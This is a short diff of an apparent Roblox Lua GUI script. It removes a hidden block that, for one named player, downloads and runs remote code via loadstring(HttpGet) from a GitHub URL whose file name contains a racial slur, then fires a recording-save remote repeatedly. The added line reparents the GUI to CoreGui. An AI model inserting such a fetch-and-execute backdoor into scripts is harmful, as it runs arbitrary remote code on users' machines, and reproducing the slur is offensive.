@@ -1,23 +1,6 @@
-if game.Players.LocalPlayer.Name == "XoPoetI" then
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/hellohellohell012321/TALENTLESS/main/smd_nigga", true))()
-    
-game:GetService("ReplicatedStorage").PianoEvents.SaveRecording:FireServer(1)
-game:GetService("ReplicatedStorage").PianoEvents.SaveRecording:FireServer(2)
-game:GetService("ReplicatedStorage").PianoEvents.SaveRecording:FireServer(3)
-game:GetService("ReplicatedStorage").PianoEvents.SaveRecording:FireServer(4)
-game:GetService("ReplicatedStorage").PianoEvents.SaveRecording:FireServer(5)
-game:GetService("ReplicatedStorage").PianoEvents.SaveRecording:FireServer(6)
-game:GetService("ReplicatedStorage").PianoEvents.SaveRecording:FireServer(7)
-game:GetService("ReplicatedStorage").PianoEvents.SaveRecording:FireServer(8)
-
-return
-
-else end
-
 local G2L = {};
 
-G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
+G2L["1"] = Instance.new("ScreenGui", game:GetService("CoreGui"));
 G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
 
 G2L["2"] = Instance.new("Frame", G2L["1"]);
